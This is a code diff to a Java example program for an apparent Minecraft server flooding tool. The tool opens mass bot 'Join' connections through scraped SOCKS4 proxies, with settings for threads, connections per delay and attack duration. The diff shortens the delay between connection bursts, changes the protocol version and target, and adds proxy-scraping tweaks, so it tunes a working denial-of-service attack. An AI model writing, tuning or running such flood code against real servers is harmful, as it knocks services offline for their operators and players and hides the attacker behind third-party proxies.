@@ -3,6 +3,7 @@ package test;
 import dev.lastknell.core.NettyBootstrap;
 import dev.lastknell.core.methods.IMethod;
 import dev.lastknell.core.methods.impl.Join;
+import dev.lastknell.core.methods.impl.Ping;
 import dev.lastknell.core.proxy.Proxy;
 import dev.lastknell.core.proxy.ProxyManager;
 import dev.lastknell.core.proxy.util.ProxyScraper;
@@ -25,7 +26,7 @@ public class AsuraExample {
      */
 
     public static void main(String[] args) {
-        String srvIP = "0.0.0.0";
+        String srvIP = "localhost";
         int port = 25565;
         IMethod method = new Join();
         // setup nettybootstrap
@@ -33,10 +34,10 @@ public class AsuraExample {
                 .connectLoopThreads(3)
                 .workerThreads(256)
                 .proxyType(ProxyType.SOCKS4)
-                .delay(100) //in ms
+                .delay(10) //in ms
                 .perDelay(10) // connections per delay
                 .duration(10) //attack duration
-                .protocolID(760) //miecraft version protocol id
+                .protocolID(47) //miecraft version protocol id
                 .proxyManager(makeProxyManager()) //proxy manager
                 .usingEpoll(false) // gives high performance in linux if true
                 .build();
@@ -44,13 +45,16 @@ public class AsuraExample {
         // start attack
         bootstrap.start();
 
+        // stop attack (before duration)
+        bootstrap.stop();
+
         // u can print or use live updated values in bootstrap
         while (!bootstrap.shouldStop) {
             System.out.println(bootstrap.averageCPS);
             // sleep for 1000 sec as CPS updates every sec so no use to see its value
-            // between a interval if sec
+            // between interval if sec
             try {
-                sleep(1000);
+                sleep(1500);
             } catch (InterruptedException e) {
                 e.printStackTrace();
             }
@@ -68,10 +72,16 @@ public class AsuraExample {
             ProxyScraper scraper = new ProxyScraper(urls);
             // scrape proxies from links
             scraper.scrape();
+
+            Thread.sleep(3000L);
             // get proxies
             proxies = new ArrayList<>(scraper.getProxies());
+            //System.out.println(proxies + "ad");
+            //System.out.println(scraper.getProxies());
         } catch (MalformedURLException e) {
             e.printStackTrace();
+        } catch (InterruptedException e) {
+            throw new RuntimeException(e);
         }
         // make proxy manager
         return new ProxyManager(proxies);
